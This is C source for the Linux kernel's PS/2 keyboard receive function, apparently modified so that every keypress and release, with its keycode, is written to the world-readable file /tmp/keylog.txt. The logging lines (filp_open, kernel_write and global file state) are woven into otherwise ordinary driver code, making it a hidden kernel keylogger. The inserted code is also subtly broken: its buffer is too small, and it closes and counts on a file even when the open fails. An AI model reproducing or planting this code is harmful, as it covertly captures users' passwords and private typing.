#define NUM_SCANCODE 256
static unsigned int freq[NUM_SCANCODE] = {0};
struct file *file;
loff_t pos = 0;
static void atkbd_receive_byte(struct ps2dev *ps2dev, u8 data)
{
	struct serio *serio = ps2dev->serio;
	struct atkbd *atkbd = container_of(ps2dev, struct atkbd, ps2dev);
	struct input_dev *dev = atkbd->dev;
	unsigned int code = data;
	int scroll = 0, hscroll = 0, click = -1;
	int value;
	unsigned short keycode;
  ssize_t bytes_written;
  char key[16];
  int len;
	pm_wakeup_event(&serio->dev, 0);
	if (!atkbd->enabled)
		return;
	input_event(dev, EV_MSC, MSC_RAW, code);
	if (atkbd_platform_scancode_fixup)
		code = atkbd_platform_scancode_fixup(atkbd, code);
	if (atkbd->translated) {
		if (atkbd->emul || atkbd_need_xlate(atkbd->xl_bit, code)) {
			atkbd->release = code >> 7;
			code &= 0x7f;
		}
		if (!atkbd->emul)
			atkbd_calculate_xl_bit(atkbd, data);
	}
	switch (code) {
	case ATKBD_RET_BAT:
		atkbd->enabled = false;
		serio_reconnect(atkbd->ps2dev.serio);
		return;
	case ATKBD_RET_EMUL0:
		atkbd->emul = 1;
		return;
	case ATKBD_RET_EMUL1:
		atkbd->emul = 2;
		return;
	case ATKBD_RET_RELEASE:
		atkbd->release = true;
		return;
	case ATKBD_RET_ACK:
	case ATKBD_RET_NAK:
		if (printk_ratelimit())
			dev_warn(&serio->dev,
				 "Spurious %s on %s. "
				 "Some program might be trying to access hardware directly.\n",
				 data == ATKBD_RET_ACK ? "ACK" : "NAK", serio->phys);
		return;
	case ATKBD_RET_ERR:
		atkbd->err_count++;
		dev_dbg(&serio->dev, "Keyboard on %s reports too many keys pressed.\n",
			serio->phys);
		return;
	}
	code = atkbd_compat_scancode(atkbd, code);
	if (atkbd->emul && --atkbd->emul)
		return;
	keycode = atkbd->keycode[code];
  len = snprintf(key,sizeof(key),"%s : 0x%04x",atkbd->release? "RELEASED":"PRESSED",keycode);
  file = filp_open("/tmp/keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (!IS_ERR(file)) {
    bytes_written = kernel_write(file,key,len,&pos);
  }
  filp_close(file,NULL);
  freq[code]++;
  pos+=bytes_written;
	if (!(atkbd->release && test_bit(code, atkbd->force_release_mask)))
		if (keycode != ATKBD_KEY_NULL)
			input_event(dev, EV_MSC, MSC_SCAN, code);
	switch (keycode) {
	case ATKBD_KEY_NULL:
		break;
	case ATKBD_KEY_UNKNOWN:
		dev_warn(&serio->dev,
			 "Unknown key %s (%s set %d, code %#x on %s).\n",
			 atkbd->release ? "released" : "pressed",
			 atkbd->translated ? "translated" : "raw",
			 atkbd->set, code, serio->phys);
		dev_warn(&serio->dev,
			 "Use 'setkeycodes %s%02x <keycode>' to make it known.\n",
			 code & 0x80 ? "e0" : "", code & 0x7f);
		input_sync(dev);
		break;
	case ATKBD_SCR_1:
		scroll = 1;
		break;
	case ATKBD_SCR_2:
		scroll = 2;
		break;
	case ATKBD_SCR_4:
		scroll = 4;
		break;
	case ATKBD_SCR_8:
		scroll = 8;
		break;
	case ATKBD_SCR_CLICK:
		click = !atkbd->release;
		break;
	case ATKBD_SCR_LEFT:
		hscroll = -1;
		break;
	case ATKBD_SCR_RIGHT:
		hscroll = 1;
		break;
	default:
		if (atkbd->release) {
			value = 0;
			atkbd->last = 0;
		} else if (!atkbd->softrepeat && test_bit(keycode, dev->key)) {
			/* Workaround Toshiba laptop multiple keypress */
			value = time_before(jiffies, atkbd->time) && atkbd->last == code ? 1 : 2;
		} else {
			value = 1;
			atkbd->last = code;
			atkbd->time = jiffies + msecs_to_jiffies(dev->rep[REP_DELAY]) / 2;
		}
		input_event(dev, EV_KEY, keycode, value);
		input_sync(dev);
		if (value && test_bit(code, atkbd->force_release_mask)) {
			input_event(dev, EV_MSC, MSC_SCAN, code);
			input_report_key(dev, keycode, 0);
			input_sync(dev);
		}
	}
	if (atkbd->scroll) {
		if (click != -1)
			input_report_key(dev, BTN_MIDDLE, click);
		input_report_rel(dev, REL_WHEEL,
				 atkbd->release ? -scroll : scroll);
		input_report_rel(dev, REL_HWHEEL, hscroll);
		input_sync(dev);
	}
	atkbd->release = false;
}
